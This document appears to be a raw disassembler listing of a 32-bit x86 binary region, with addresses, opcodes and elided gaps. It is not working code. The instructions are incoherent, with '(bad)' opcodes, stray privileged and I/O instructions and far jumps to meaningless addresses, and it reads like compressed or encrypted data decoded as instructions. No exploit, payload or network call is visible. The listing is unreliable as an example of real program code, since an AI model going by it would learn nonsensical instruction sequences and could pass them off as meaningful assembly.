  420375:	push   es
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	std    
  420381:	dec    edi
  420382:	cdq    
  420383:	sub    eax,0x156e8
  420388:	add    al,0x1
  42038a:	add    BYTE PTR [eax],al
  42038c:	int3   
  42038d:	test   BYTE PTR [ebp+0x57],0x6b
  420391:	fwait
  420392:	dec    esi
  420393:	popf   
  420394:	pusha  
  420395:	sbb    al,BYTE PTR [edx+0x47]
  420398:	iret   
  420399:	out    dx,al
  42039a:	push   edi
  42039b:	inc    ebx
  42039c:	ficomp WORD PTR [ebx+0x6512309e]
  4203a2:	sti    
  4203a3:	inc    esi
  4203a4:	mov    DWORD PTR [ecx+0x4e4801fa],ebp
  4203aa:	dec    ebx
  4203ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203ac:	scas   eax,DWORD PTR es:[edi]
  4203ad:	out    0x92,eax
  4203af:	sbb    ah,BYTE PTR [edi]
  4203b1:	jns    0x4203c6
  4203b3:	mov    ds:0xaaa026,eax
  4203b8:	outs   dx,DWORD PTR ds:[esi]
  4203b9:	sbb    ebx,DWORD PTR [edx+0x40]
  4203bc:	add    BYTE PTR [edx+ebp*8-0x4112d21c],al
  4203c3:	mov    ds:0x71544848,al
  4203c8:	(bad)  
  4203c9:	jb     0x420354
  4203cb:	sub    dl,BYTE PTR [edi]
  4203cd:	rcl    BYTE PTR [edx-0x72fd1796],cl
  4203d3:	add    bh,ah
  4203d5:	mov    gs,ebx
  4203d7:	xlat   BYTE PTR ds:[ebx]
  4203d8:	pushf  
  4203d9:	sar    DWORD PTR [ebx+0xd],cl
  4203dc:	out    dx,al
  4203dd:	push   eax
  4203de:	xor    DWORD PTR ds:0xf1a57a6,0x72
  4203e5:	mov    dh,BYTE PTR [ebx-0x54]
  4203e8:	jo     0x4203e9
  4203ea:	and    eax,0xf4e7d1a3
  4203ef:	xchg   esi,eax
  4203f0:	sub    BYTE PTR [eax+0xc6b165b],0x6c
  4203f7:	imul   DWORD PTR [esi-0x4a49b1da]
  4203fd:	inc    ebp
  4203fe:	mov    ebp,0xe1794a44
  420403:	mov    esi,0xfc17a653
  420408:	cld    
  420409:	cs call 0x5bfd:0xfb3a4110
  420411:	sub    DWORD PTR [edi-0x44],eax
  420414:	inc    ecx
  420415:	sub    edx,eax
  420417:	pop    ebp
  420418:	push   edx
  420419:	fst    QWORD PTR [ebx-0xc5a7c40]
  42041f:	idiv   BYTE PTR [esi+eiz*2+0x4d]
  420423:	or     ebp,ecx
  420425:	cmp    al,0x24
  420427:	pop    ebp
  420428:	xor    ch,BYTE PTR [ebp-0x117fbc1f]
  42042e:	aam    0x53
  420430:	retf   0x7916
  420433:	fisttp WORD PTR [esi+eiz*2+0x2b]
  420437:	fwait
  420438:	sbb    ecx,DWORD PTR [eax]
  42043a:	mov    ebp,0x76795c7a
  42043f:	add    BYTE PTR [edx+0x2e],cl
  420442:	or     cl,BYTE PTR [esi+0x1810f302]
  420448:	fisttp WORD PTR [ebx]
  42044a:	pop    esp
  42044b:	gs dec ebx
  42044d:	cmp    bl,BYTE PTR [edi]
  42044f:	int    0xb5
  420451:	loop   0x42043f
  420453:	dec    ecx
  420454:	into   
  420455:	mov    bh,0x55
  420457:	loopne 0x4204ac
  420459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42045a:	loop   0x4203e5
  42045c:	mov    esi,DWORD PTR [ebp-0x5a2e0892]
  420462:	dec    ecx
  420463:	lods   al,BYTE PTR ds:[esi]
  420464:	mov    DWORD PTR [ebp-0x50d658f0],esp
  42046a:	das    
  42046b:	scas   al,BYTE PTR es:[edi]
  42046c:	std    
  42046d:	test   al,0x66
  42046f:	lods   eax,DWORD PTR ds:[esi]
  420470:	(bad)  
  420471:	and    al,cl
  420473:	add    eax,0x95234899
  420478:	sbb    dh,BYTE PTR [eax-0x6d]
  42047b:	loop   0x4204b0
  42047d:	adc    DWORD PTR [edi+0x9],0x7c2cd509
  420484:	dec    edx
  420485:	out    0x31,al
  420487:	or     DWORD PTR [eax+0x64089347],ecx
  42048d:	xchg   edi,eax
  42048e:	ja     0x42049f
	...
  4204f4:	scas   al,BYTE PTR es:[edi]
  4204f5:	xchg   esp,eax
  4204f6:	push   edi
  4204f7:	adc    bh,BYTE PTR [edi-0x2d]
  4204fa:	out    dx,eax
  4204fb:	mov    esp,0x5a7f6c39
  420500:	ror    BYTE PTR [ebx],0x47
  420503:	gs in  al,dx
  420505:	push   edi
  420506:	add    DWORD PTR [eax],eax
  420508:	add    al,0x1
  42050a:	add    BYTE PTR [eax],al
  42050c:	jno    0x4204eb
  42050e:	push   eax
  42050f:	cdq    
  420510:	lods   al,BYTE PTR ds:[esi]
  420511:	mov    ds:0xe4ebd8f9,eax
  420516:	pop    eax
  420517:	in     al,dx
  420518:	ret    
  420519:	inc    ebx
  42051a:	xchg   edi,eax
  42051b:	xor    al,0xdf
  42051d:	add    DWORD PTR [edx],ecx
  42051f:	pop    ss
  420520:	mov    WORD PTR [edi-0xa],cs
  420523:	sub    al,0xa0
  420525:	and    DWORD PTR [esi+0x59076a3],ecx
  42052b:	pop    ebx
  42052c:	loop   0x420579
  42052e:	push   ds
  42052f:	cdq    
  420530:	es stos BYTE PTR es:[edi],al
  420532:	sti    
  420533:	dec    edx
  420534:	(bad)  
  420535:	cmp    DWORD PTR [eax-0x77],ecx
  420538:	(bad)  [ebx-0x38]
  42053b:	and    DWORD PTR [esi-0x5c2b59f3],esp
  420541:	ins    DWORD PTR es:[edi],dx
  420542:	sar    BYTE PTR [ecx],0x64
  420545:	popf   
  420546:	push   ds
  420547:	sub    al,0x1
  420549:	ret    0xa443
  42054c:	push   eax
  42054d:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  42054f:	out    dx,al
  420550:	xchg   edi,eax
  420551:	mov    bl,0x4
  420553:	fadd   QWORD PTR [ebx-0x36]
  420556:	test   DWORD PTR [eax-0xe25bcb5],ecx
  42055c:	popa   
  42055d:	and    DWORD PTR [eax],edi
  42055f:	les    ebp,FWORD PTR [edi-0x16ff0a0a]
  420565:	inc    eax
  420566:	adc    DWORD PTR [ebp+0x1c],ecx
  420569:	sub    eax,0x8ba5f930
  42056e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42056f:	stc    
  420570:	ds sbb ebx,ebp
  420573:	sub    cl,dl
  420575:	dec    ebx
  420576:	test   BYTE PTR [ebx+esi*8-0x16845b7],ch
  42057d:	pop    edx
  42057e:	into   
  42057f:	bound  edi,QWORD PTR [esi+0x4e61917]
  420585:	mov    DWORD PTR [ebx-0x68],esp
  420588:	mov    DWORD PTR [edx-0xff3346c],esp
  42058e:	mov    ecx,DWORD PTR [edi]
  420590:	mov    eax,ds:0x346e04e2
  420595:	ret    
  420596:	ds push ecx
  420598:	or     al,0x6d
  42059a:	pop    es
  42059b:	pop    ebp
  42059c:	pop    edi
  42059d:	loopne 0x4205b3
  42059f:	rcl    DWORD PTR [edi],0xf0
  4205a2:	outs   dx,DWORD PTR ds:[esi]
  4205a3:	retf   
  4205a4:	fnstcw WORD PTR [ecx]
  4205a6:	mov    edi,DWORD PTR [edi+0x1c2e13c4]
  4205ac:	fwait
  4205ad:	cdq    
  4205ae:	xchg   edx,eax
  4205af:	cwde   
  4205b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205b1:	in     al,0x33
  4205b3:	cmp    dl,dh
  4205b5:	neg    bl
  4205b7:	hlt    
  4205b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205b9:	add    ch,BYTE PTR [eax]
  4205bb:	mov    bh,0xb2
  4205bd:	mov    eax,ds:0xd6872ff6
  4205c2:	retf   
  4205c3:	aam    0x7e
  4205c5:	and    esi,edi
  4205c7:	inc    edi
  4205c8:	xor    DWORD PTR [edx+0x2d],esi
  4205cb:	push   es
  4205cc:	sbb    al,0xab
  4205ce:	or     ebx,esp
  4205d0:	jae    0x42056f
  4205d2:	int3   
  4205d3:	jmp    0x3b1c:0x9832a11d
  4205da:	in     al,dx
  4205db:	outs   dx,BYTE PTR ds:[esi]
  4205dc:	fwait
  4205dd:	paddsw mm6,mm2
  4205e0:	mov    bl,0x26
  4205e2:	leave  
  4205e3:	loope  0x420601
  4205e5:	int    0x4e
  4205e7:	adc    bh,bl
  4205e9:	sub    edi,esp
  4205eb:	cli    
  4205ec:	xchg   ebx,eax
  4205ed:	mov    bh,0xe9
  4205ef:	lods   al,BYTE PTR ds:[esi]
  4205f0:	xor    DWORD PTR [ecx],esp
  4205f2:	add    BYTE PTR [ecx],al
  4205f4:	push   ss
  4205f5:	ins    BYTE PTR es:[edi],dx
  4205f6:	jo     0x42066f
  4205f8:	mov    DWORD PTR [edi-0x78],esi
  4205fb:	aas    
  4205fc:	fnstenv [edx+0x32]
  4205ff:	imul   BYTE PTR [ecx+edx*8-0x3]
  420603:	xor    al,0xc5
  420605:	add    ecx,ebp
  420607:	retf   
  420608:	dec    edx
  420609:	loope  0x420627
  42060b:	ja     0x420641
  42060d:	xchg   ebp,eax
  42060e:	mov    ?,WORD PTR [ebx]
	...
  420674:	test   BYTE PTR [eax-0x48],ch
  420677:	or     ah,bh
  420679:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  420680:	iret   
  420681:	add    BYTE PTR [eax],bl
  420683:	gs lock pop eax
  420686:	add    DWORD PTR [eax],eax
  420688:	add    al,0x1
  42068a:	add    BYTE PTR [eax],al
  42068c:	mov    ds:0x11c7c705,eax
  420691:	neg    DWORD PTR [esi+0x67]
  420694:	mov    esp,0xcf49cbd6
  420699:	rol    BYTE PTR [ecx],0xc9
  42069c:	mov    esi,edi
  42069e:	cmp    ecx,DWORD PTR [esi]
  4206a0:	xchg   ebp,eax
  4206a1:	mov    ah,0x6e
  4206a3:	neg    BYTE PTR [eax+0x7ddeb67d]
  4206a9:	inc    esp
  4206aa:	add    esp,DWORD PTR ds:0x8e348a7a
  4206b0:	ins    BYTE PTR es:[edi],dx
  4206b1:	pop    edi
  4206b2:	jno    0x42063f
  4206b4:	jo     0x4206a9
  4206b6:	out    dx,al
  4206b7:	sbb    eax,0x92e4ea25
  4206bc:	mov    ah,0x11
  4206be:	sbb    al,0x28
  4206c0:	iret   
  4206c1:	ins    DWORD PTR es:[edi],dx
  4206c2:	call   0x63c8:0x99997740
  4206c9:	test   al,0x48
  4206cb:	mov    bh,0xb2
  4206cd:	sbb    ebp,DWORD PTR [esi]
  4206cf:	test   al,0x51
  4206d1:	dec    esi
  4206d2:	mov    ah,0xaf
  4206d4:	rcl    DWORD PTR ds:0x8ae0cf87,1
  4206da:	test   eax,0xfee1f6b6
  4206df:	cwde   
  4206e0:	or     BYTE PTR ss:[ebp-0xe07284],al
  4206e7:	je     0x420713
  4206e9:	xchg   edi,eax
  4206ea:	in     eax,0x7f
  4206ec:	rcl    BYTE PTR [esi+0x20242076],0xda
  4206f3:	xchg   ecx,eax
  4206f4:	ins    DWORD PTR es:[edi],dx
  4206f5:	dec    ebx
  4206f6:	or     al,BYTE PTR [edx]
  4206f8:	cmp    ecx,DWORD PTR [edi-0x29]
  4206fb:	stc    
  4206fc:	rcr    ecx,cl
  4206fe:	das    
  4206ff:	pop    esi
  420700:	sbb    dl,BYTE PTR [ecx+0x37]
  420703:	inc    esi
  420704:	inc    BYTE PTR [ecx+esi*8]
  420707:	sbb    eax,0x148e76b2
  42070c:	inc    ebx
  42070d:	sub    BYTE PTR [edi],dl
  42070f:	dec    edi
  420710:	push   cs
  420711:	mov    bl,0xe1
  420713:	or     BYTE PTR [ebp+0x7],dh
  420716:	pop    esp
  420717:	jecxz  0x4206e0
  420719:	jae    0x420716
  42071b:	dec    eax
  42071c:	inc    ebp
  42071d:	pop    ds
  42071e:	test   al,0x4f
  420720:	xchg   edx,eax
  420721:	sti    
  420722:	imul   edx,DWORD PTR [ebx-0x159ebf3f],0xffffff9c
  420729:	das    
  42072a:	sub    DWORD PTR [ebx-0x7d63b4dc],esp
  420730:	adc    al,0x90
  420732:	test   ah,ah
  420734:	outs   dx,BYTE PTR ds:[esi]
  420736:	mov    esi,0xb93e7a28
  42073b:	test   al,0xf0
  42073d:	xor    cl,ch
  42073f:	xchg   ebx,eax
  420740:	or     esp,DWORD PTR [edi-0x70fc4c1d]
  420746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420747:	jge    0x4206e2
  420749:	or     eax,0x6b6cf613
  42074e:	xlat   BYTE PTR ds:[ebx]
  42074f:	shl    DWORD PTR [edi+edi*1+0x3c],0xcd
  420754:	in     al,0x9b
  420756:	into   
  420757:	dec    esp
  420758:	call   0xfb7fff20
  42075d:	or     al,BYTE PTR [eax+0x2c]
  420760:	cmp    DWORD PTR [ebx+esi*8-0x41],ecx
  420764:	hlt    
  420765:	mov    ecx,ds
  420767:	mov    ecx,0xe341faa1
  42076c:	mov    dh,0x69
  42076e:	fadd   DWORD PTR [eax+0x1a]
  420771:	dec    edx
  420772:	cmp    eax,0x905863e7
  420777:	hlt    
  420778:	ja     0x42074d
  42077a:	fldcw  WORD PTR [ebp+0x3bfb35e7]
  420780:	neg    DWORD PTR [edi]
  420782:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420784:	xchg   ecx,eax
  420785:	shl    BYTE PTR [esi-0x550eea18],1
  42078b:	mov    WORD PTR [eax+0x384707],es
	...
  4207f1:	add    BYTE PTR [eax],al
  4207f3:	add    BYTE PTR [ecx-0x587fdad1],cl
  4207f9:	mov    ch,BYTE PTR [ebp-0x2390c6d1]
  4207ff:	pusha  
  420800:	xchg   esi,eax
  420801:	repnz cld 
  420803:	test   esp,esi
  420805:	pop    ecx
  420806:	add    DWORD PTR [eax],eax
  420808:	add    al,0x1
  42080a:	add    BYTE PTR [eax],al
  42080c:	sbb    DWORD PTR [ebp+0x2c],edx
  42080f:	fild   DWORD PTR [ebx+0x2a]
  420812:	jmp    0x9a17:0x70242813
  420819:	xchg   esp,eax
  42081a:	mov    eax,0xe7ca05a5
  42081f:	js     0x42089d
  420821:	jns    0x420890
  420823:	sub    esi,edi
  420825:	ss cmp al,0x4e
  420828:	sub    ah,BYTE PTR [esi]
  42082a:	or     BYTE PTR [eax+ebp*8],bl
  42082d:	cdq    
  42082e:	and    BYTE PTR [edx+eiz*4],0x2a
  420832:	aas    
  420833:	xor    ecx,DWORD PTR [ecx-0x4b]
  420836:	xchg   BYTE PTR [esp+esi*1+0x38],dh
  42083a:	repz cmp ebx,DWORD PTR [edx]
  42083d:	xchg   esi,eax
  42083e:	out    dx,eax
  42083f:	and    DWORD PTR [ecx+0x5e34f831],esi
  420845:	fs add DWORD PTR es:[esi-0x58],ebx
  42084a:	sar    BYTE PTR [ecx+0xe27c783],1
  420850:	test   eax,0x6ec790b4
  420855:	pop    ds
  420856:	pop    edi
  420857:	cmp    BYTE PTR [ecx],al
  420859:	iret   
  42085a:	rcl    DWORD PTR [esi+0x6cb4eb02],1
  420860:	lock aam 0x75
  420863:	aam    0x16
  420865:	pop    edi
  420866:	cmp    BYTE PTR [edx],ah
  420868:	pop    es
  420869:	test   DWORD PTR [edi],ebp
  42086b:	and    esp,esp
  42086d:	sbb    BYTE PTR [edi+0x42],0x41
  420871:	dec    ebp
  420872:	jmp    0x8722:0x8ea87dde
  420879:	pop    ss
  42087a:	into   
  42087b:	mov    eax,ds:0xf99a9ee7
  420880:	test   al,0x33
  420882:	shl    DWORD PTR [edx-0x12],0xd6
  420886:	retf   0x5d29
  420889:	nop
  42088a:	rcr    dl,1
  42088c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42088d:	clc    
  42088e:	adc    ebp,esi
  420890:	adc    eax,0xac4cbecd
  420895:	jp     0x4208d9
  420897:	scas   eax,DWORD PTR es:[edi]
  420898:	pop    ecx
  420899:	xor    eax,0x4ed2933c
  42089e:	push   ebp
  42089f:	xor    DWORD PTR [eax],ebp
  4208a1:	add    BYTE PTR [ecx],bh
  4208a3:	(bad)  
  4208a4:	push   esi
  4208a5:	push   eax
  4208a6:	or     DWORD PTR [ebx-0x78],ebx
  4208a9:	or     DWORD PTR ds:[edx-0x37bf2b75],ebp
  4208b0:	xor    DWORD PTR [ebx],edi
  4208b2:	inc    eax
  4208b3:	out    dx,al
  4208b4:	pop    ebx
  4208b5:	push   eax
  4208b6:	stos   DWORD PTR es:[edi],eax
  4208b7:	retf   
  4208b8:	push   eax
  4208b9:	adc    al,0x16
  4208bb:	and    BYTE PTR [ebx+edi*4+0xf],bh
  4208bf:	shl    DWORD PTR [ecx],1
  4208c1:	es daa 
  4208c3:	ss jne 0x42091b
  4208c6:	xor    eax,0xf9222d5
  4208cb:	imul   esp,ebp,0x175ab991
  4208d1:	daa    
  4208d2:	cmp    DWORD PTR [esi-0x2f19362d],0xebc8001c
  4208dc:	and    DWORD PTR [eax-0x7c1eaddb],edi
  4208e2:	xchg   esp,eax
  4208e3:	ret    0xfb09
  4208e6:	sub    bh,BYTE PTR [eax-0x19649b12]
  4208ec:	aad    0x4f
  4208ee:	jg     0x420884
  4208f0:	test   DWORD PTR [esi-0x17],ebp
  4208f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208f4:	jne    0x42091f
  4208f6:	jb     0x420905
  4208f8:	mov    WORD PTR [ebp-0x7f1e11c0],es
  4208fe:	xchg   esp,eax
  4208ff:	out    dx,eax
  420900:	imul   ebx,DWORD PTR [ebx-0x738af4b2],0xc6be11d
  42090a:	(bad)  
  42090b:	adc    eax,0xf64379ab
	...
  420974:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0xd0
  420981:	lods   eax,DWORD PTR ds:[esi]
  420982:	jmp    0x400:0x15af8e6
  420989:	add    DWORD PTR [eax],eax
  42098b:	add    BYTE PTR [edi+0x64d1b262],cl
  420991:	pop    es
  420992:	in     al,dx
  420993:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420994:	stos   DWORD PTR es:[edi],eax
  420995:	mov    ebx,0xca1cff2e
  42099a:	cli    
  42099b:	sub    BYTE PTR [ebp+0x113bae39],ah
  4209a1:	pop    edx
  4209a2:	xchg   edx,eax
  4209a3:	ret    0x4aac
  4209a6:	jo     0x42095f
  4209a8:	call   0x1fa04299
  4209ad:	shl    BYTE PTR [edi+0x659aad49],cl
  4209b3:	lock je 0xcc5e9c
  4209ba:	mov    eax,ds:0x290a4cd6
  4209bf:	xchg   esi,eax
  4209c0:	hlt    
  4209c1:	mov    ds:0x250661f9,al
  4209c6:	int    0x1a
  4209c8:	push   esi
  4209c9:	test   al,dl
  4209cb:	cmp    ah,cl
  4209cd:	adc    al,0x66
  4209cf:	and    al,0x18
  4209d1:	or     eax,0x8c735eca
  4209d6:	aam    0x30
  4209d8:	inc    ebx
  4209d9:	out    0x32,eax
  4209db:	pop    esp
  4209dc:	cmp    cl,ah
  4209de:	scas   al,BYTE PTR es:[edi]
  4209df:	pop    esp
  4209e0:	xchg   edx,eax
  4209e1:	sar    DWORD PTR [esi],0x7b
  4209e4:	or     al,0xb0
  4209e6:	out    0xfe,al
  4209e8:	stos   DWORD PTR es:[edi],eax
  4209e9:	ss sar al,cl
  4209ec:	adc    al,0x38
  4209ee:	mov    eax,ebp
  4209f0:	pop    ebx
  4209f1:	std    
  4209f2:	xor    bl,al
  4209f4:	cmp    eax,0x2a549e52
  4209f9:	enter  0x76e8,0x65
  4209fd:	daa    
  4209fe:	cmp    DWORD PTR [edi-0x17],esi
  420a01:	sbb    ah,dl
  420a03:	cs push ss
  420a05:	xchg   edi,eax
  420a06:	sbb    al,0xb1
  420a08:	sar    BYTE PTR [eax+ebp*1+0xa2ac871],1
  420a0f:	shl    BYTE PTR [esi+0x44],1
  420a12:	xchg   esp,eax
  420a13:	xchg   ebp,eax
  420a14:	jmp    0x420a03
  420a16:	dec    esp
  420a17:	ins    BYTE PTR es:[edi],dx
  420a18:	stos   BYTE PTR es:[edi],al
  420a19:	mov    dh,0x73
  420a1b:	sub    esp,DWORD PTR [ecx-0x62]
  420a1e:	or     al,0x60
  420a20:	add    DWORD PTR [edi+0x2bc8c012],esp
  420a26:	cmp    BYTE PTR [ebx+0x1f],0x42
  420a2a:	sbb    esp,DWORD PTR [edx+0x3e53085f]
  420a30:	jg     0x420a7a
  420a32:	out    dx,eax
  420a33:	and    DWORD PTR [esi+0x4d],edi
  420a36:	jne    0x420a16
  420a38:	fs ja  0x420a7f
  420a3b:	retf   0xffe2
  420a3e:	shl    DWORD PTR ds:[ecx],0x89
  420a42:	add    BYTE PTR ds:0x33962219,0x74
  420a49:	test   al,0x89
  420a4b:	jl     0x420a79
  420a4d:	inc    eax
  420a4e:	mov    dh,0x2e
  420a50:	jmp    0x93eded84
  420a55:	dec    eax
  420a56:	outs   dx,BYTE PTR ds:[esi]
  420a57:	sar    DWORD PTR [esp+edi*1+0x7ce84e26],0x65
  420a5f:	jge    0x420a40
  420a61:	shl    BYTE PTR [ebx],0xd5
  420a64:	pusha  
  420a65:	mov    esi,0xfa2f2b7b
  420a6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a6b:	dec    ebx
  420a6c:	out    dx,al
  420a6d:	inc    edi
  420a6e:	mov    ebp,DWORD PTR [edi+0xd993b69]
  420a74:	push   ds
  420a75:	sub    BYTE PTR [eax+0x627d0e55],bh
  420a7b:	add    BYTE PTR [esi],bl
  420a7d:	out    0x7e,al
  420a7f:	mov    al,ds:0xa4031c54
  420a84:	sub    edx,DWORD PTR [ecx-0x14]
  420a87:	jp     0x420aeb
  420a89:	lahf   
  420a8a:	pop    ds
  420a8b:	fld    st(2)
  420a8d:	sbb    bl,BYTE PTR [ebp+0x11]
	...
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	fld    TBYTE PTR [ebp-0x16]
  420b03:	stos   DWORD PTR es:[edi],eax
  420b04:	cld    
  420b05:	pop    ebx
  420b06:	add    DWORD PTR [eax],eax
  420b08:	add    al,0x1
  420b0a:	add    BYTE PTR [eax],al
  420b0c:	xor    eax,0x56b72bd5
  420b11:	add    eax,0xbc0bb2a6
  420b16:	aad    0x56
  420b18:	mov    eax,ds:0xb0090f64
  420b1d:	inc    esp
  420b1e:	es cmp al,0x4e
  420b21:	das    
  420b22:	xor    BYTE PTR [ebp-0x6d],0x3e
  420b26:	mov    ebp,0xb3cd655f
  420b2b:	hlt    
  420b2c:	dec    esi
  420b2d:	mov    ch,0x6e
  420b2f:	shl    BYTE PTR ds:0xa4ce7406,cl
  420b35:	es jge 0x420b9d
  420b38:	mov    eax,ds:0x83a8440d
  420b3d:	inc    eax
  420b3e:	cmp    dh,BYTE PTR [eax+edx*4+0x6c]
  420b42:	push   ebx
  420b43:	test   dl,dl
  420b45:	fs out dx,al
  420b47:	mov    cl,0x63
  420b49:	stos   BYTE PTR es:[edi],al
  420b4a:	cli    
  420b4b:	fwait
  420b4c:	jg     0x420ba8
  420b4e:	add    dl,dh
  420b50:	pcmpgtw mm4,QWORD PTR [ebp-0x7c]
  420b54:	pop    es
  420b55:	stos   BYTE PTR es:[edi],al
  420b56:	out    dx,eax
  420b57:	cld    
  420b58:	pop    ebx
  420b59:	push   esi
  420b5a:	repnz retf 0x5862
  420b5e:	sbb    al,0x49
  420b60:	fistp  DWORD PTR [edx+0x21]
  420b63:	push   esi
  420b64:	jl     0x420afa
  420b66:	loopne 0x420b40
  420b68:	inc    edi
  420b69:	xchg   ebp,eax
  420b6a:	xor    dl,BYTE PTR [edi-0x6112cc25]
  420b70:	arpl   WORD PTR [ebp-0x2b],cx
  420b73:	cmp    ebx,ebx
  420b75:	push   ecx
  420b76:	cmp    al,0xbc
  420b78:	and    DWORD PTR [edx+0xb],edi
  420b7b:	inc    esi
  420b7c:	or     DWORD PTR ds:0x32a41af7,ebx
  420b82:	push   edi
  420b83:	hlt    
  420b84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b85:	test   DWORD PTR [ecx+0x3e],ebp
  420b88:	inc    ebx
  420b89:	add    dh,dl
  420b8b:	mov    esi,0x2a4fe33d
  420b90:	cwde   
  420b91:	rcl    bh,1
  420b93:	mov    al,BYTE PTR [ecx+eax*2-0x56]
  420b97:	mov    DWORD PTR [edx-0x5a19d17],esp
  420b9d:	mov    BYTE PTR [edx],bh
  420b9f:	mov    bh,0xd1
  420ba1:	ins    DWORD PTR es:[edi],dx
  420ba2:	xchg   ebp,eax
  420ba3:	lods   eax,DWORD PTR ds:[esi]
  420ba4:	sub    ebx,DWORD PTR [edx]
  420ba6:	shl    DWORD PTR [edi],1
  420ba8:	push   esi
  420ba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420baa:	cwde   
  420bab:	mov    esi,0xbd112367
  420bb0:	aad    0xe4
  420bb2:	(bad)  
  420bb3:	xlat   BYTE PTR ds:[ebx]
  420bb4:	dec    ebp
  420bb5:	outs   dx,BYTE PTR ds:[esi]
  420bb6:	push   edx
  420bb7:	sbb    ebx,DWORD PTR [eax+0x7b]
  420bba:	js     0x420bc1
  420bbc:	bound  esp,QWORD PTR [edx+ebp*2+0x40]
  420bc0:	dec    ecx
  420bc1:	push   0x21
  420bc3:	push   edx
  420bc4:	fdiv   st(0),st
  420bc6:	fistp  QWORD PTR [ebp+0x4b]
  420bc9:	sub    BYTE PTR [edx],bl
  420bcb:	fisttp DWORD PTR [ecx+0x41]
  420bce:	bound  edx,QWORD PTR [esp+ecx*8-0x2e]
  420bd2:	mov    ds:0x3bc71790,eax
  420bd7:	rcr    BYTE PTR [eax],1
  420bd9:	jp     0x420bb1
  420bdb:	dec    ebp
  420bdc:	repnz add al,0xcd
  420bdf:	pop    edx
  420be0:	mov    al,0x64
  420be2:	push   eax
  420be3:	scas   eax,DWORD PTR es:[edi]
  420be4:	or     al,0x5c
  420be6:	or     al,ch
  420be8:	cmp    eax,0xc75ca109
  420bed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bee:	mov    edx,0xb445511e
  420bf3:	shr    BYTE PTR [eax+0x4d190aaa],1
  420bf9:	and    eax,esi
  420bfb:	dec    esp
  420bfc:	sub    ebp,DWORD PTR [ebx]
  420bfe:	bound  ebx,QWORD PTR [ebx+0x286cb8c8]
  420c04:	ds push edi
  420c06:	or     edx,eax
  420c08:	push   ebp
  420c09:	xchg   eax,ecx
  420c0b:	mov    eax,0x64be42a
	...
  420c74:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420c7a:	mov    edx,0x1886e3f
  420c7f:	in     eax,0xd0
  420c81:	ins    BYTE PTR es:[edi],dx
  420c82:	clc    
  420c83:	mov    es,WORD PTR [eax]
  420c85:	pop    ebp
  420c86:	add    DWORD PTR [eax],eax
  420c88:	add    al,0x1
  420c8a:	add    BYTE PTR [eax],al
  420c8c:	test   BYTE PTR [ebx],0xc
  420c8f:	jge    0x420c37
  420c91:	pop    ebx
  420c92:	jae    0x420c31
  420c94:	aad    0x4e
  420c96:	fnsave [eax+0x71]
  420c99:	mov    ebx,0xb772b299
  420c9e:	push   0x4d072fab
  420ca3:	das    
  420ca4:	xor    dh,BYTE PTR [edi+ebx*2-0x1c8d956d]
  420cab:	jbe    0x420c77
  420cad:	dec    ebx
  420cae:	sbb    eax,0x4bfa1011
  420cb3:	repz shr BYTE PTR ds:0x94a68d9d,cl
  420cba:	addr16 jmp 0x96b0b038
  420cc0:	loop   0x420cee
  420cc2:	push   ecx
  420cc3:	mov    ds:0xcc1a28f6,al
  420cc8:	das    
  420cc9:	std    
  420cca:	ror    ebx,1
  420ccc:	retf   0xb567
  420ccf:	dec    esp
  420cd0:	jmp    0x19a5fb87
  420cd5:	pop    esp
  420cd6:	mov    ebx,0x4862d80e
  420cdb:	mov    eax,ds:0xd5738a9d
  420ce0:	ins    BYTE PTR es:[edi],dx
  420ce1:	xor    ecx,DWORD PTR [edx+ebx*4]
  420ce4:	(bad)  
  420ce5:	out    dx,eax
  420ce6:	sbb    al,0xe2
  420ce8:	pusha  
  420ce9:	sbb    eax,DWORD PTR [edx]
  420ceb:	and    ah,BYTE PTR [esi]
  420ced:	sub    al,0x7b
  420cef:	ss inc esp
  420cf1:	push   esi
  420cf2:	or     eax,DWORD PTR [ebx-0x4e]
  420cf5:	or     ch,bl
  420cf7:	cmp    dh,BYTE PTR [esp+esi*4]
  420cfa:	jns    0x420cae
  420cfc:	(bad)  
  420cfd:	cld    
  420cfe:	jl     0x420cc4
  420d00:	loope  0x420c9d
  420d02:	out    0x7a,al
  420d04:	xchg   esi,eax
  420d05:	fsubrp st(0),st
  420d07:	scas   eax,DWORD PTR es:[edi]
  420d08:	xor    al,0x3c
  420d0a:	sub    al,0x39
  420d0c:	mov    dl,0x20
  420d0e:	call   0xd03d0018
  420d13:	inc    edi
  420d14:	mov    eax,ds:0x3fe4f7f4
  420d19:	lds    esp,FWORD PTR [edi-0x7665dc6a]
  420d1f:	sbb    dl,BYTE PTR [eax+edx*2-0x41]
  420d23:	and    al,0xe7
  420d25:	ret    
  420d26:	mov    DWORD PTR [ebx],edx
  420d28:	xor    DWORD PTR [eax-0x4f62b46],eax
  420d2e:	and    ebp,0xcb097540
  420d34:	shl    ch,cl
  420d36:	pop    edi
  420d37:	cli    
  420d38:	call   0xc86e:0xba960882
  420d3f:	push   eax
  420d40:	shl    DWORD PTR [edx+edi*8+0x34],0x69
  420d45:	cwde   
